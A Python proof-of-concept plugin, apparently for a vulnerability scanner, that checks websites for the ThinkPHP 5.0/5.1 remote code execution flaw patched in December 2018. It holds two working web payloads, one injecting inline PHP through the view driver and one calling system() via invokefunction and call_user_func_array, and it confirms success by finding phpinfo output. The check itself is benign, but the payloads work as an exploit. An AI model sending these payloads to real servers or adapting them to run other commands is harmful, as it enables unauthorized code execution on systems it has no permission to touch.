# Author:w8ay
# Name:测试DEMO
'''
name: ThinkPHP5 命令执行漏洞
referer: https://www.seebug.org/vuldb/ssvid-9771
author: w8ay
description: ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。
'''
import HackRequests

def poc(arg, **kwargs):
    payloads = [r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"]
    for payload in payloads:
        vulnurl = arg + payload
        try:
            hack = HackRequests.hackRequests()
            hh = hack.http(vulnurl)

            if r"allow_url_fopen" in hh.text():
                result = {
                    "name": "ThinkPHP5 命令执行",  # 插件名称
                    "content": "ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。",  # 插件返回内容详情，会造成什么后果。
                    "url": vulnurl,  # 漏洞存在url
                    "log": hh.log,
                    "tag": "code_eval"  # 漏洞标签
                }
                return result
        except:
            pass


if __name__ == "__main__":
    pass